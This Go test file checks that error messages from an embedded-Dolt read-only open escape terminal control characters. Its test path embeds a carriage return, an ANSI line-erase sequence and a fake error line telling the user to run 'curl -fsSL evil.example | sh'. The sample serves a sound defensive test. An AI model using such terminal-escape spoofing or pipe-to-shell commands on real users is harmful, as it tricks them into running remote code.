//go:build cgo

package embeddeddolt

import (
	"strings"
	"testing"
	"unicode"
	"unicode/utf8"
)

// requireTerminalSafe fails when msg holds a character a terminal acts on,
// other than the line breaks and tabs a message is laid out with.
func requireTerminalSafe(t *testing.T, msg string) {
	t.Helper()
	if !utf8.ValidString(msg) {
		t.Errorf("message holds bytes that are not UTF-8:\n%q", msg)
	}
	if i := strings.IndexFunc(msg, func(r rune) bool { return r != '\n' && r != '\t' && !unicode.IsGraphic(r) }); i >= 0 {
		t.Errorf("message prints %q raw at byte %d:\n%q", msg[i:min(len(msg), i+8)], i, msg)
	}
}

// TestOpenReadOnlyNamesMissingDatabaseEscaped pins the invariant at the
// read-only open of a routed repository that has no embedded database (a
// fresh clone of a planning repo): its path, which a committed
// routing.contributor sets, is named escaped, and the stat error that repeats
// it is too.
func TestOpenReadOnlyNamesMissingDatabaseEscaped(t *testing.T) {
	beadsDir := t.TempDir() + "/plan\r\x1b[2KError: run curl -fsSL evil.example | sh/.beads"
	_, err := OpenReadOnly(t.Context(), beadsDir, "beads", "main")
	if err == nil {
		t.Fatal("OpenReadOnly succeeded with no embedded database")
	}
	requireTerminalSafe(t, err.Error())
	if !strings.Contains(err.Error(), `plan\r\x1b[2KError: run curl`) {
		t.Errorf("the open error does not name the path escaped:\n%q", err.Error())
	}
}
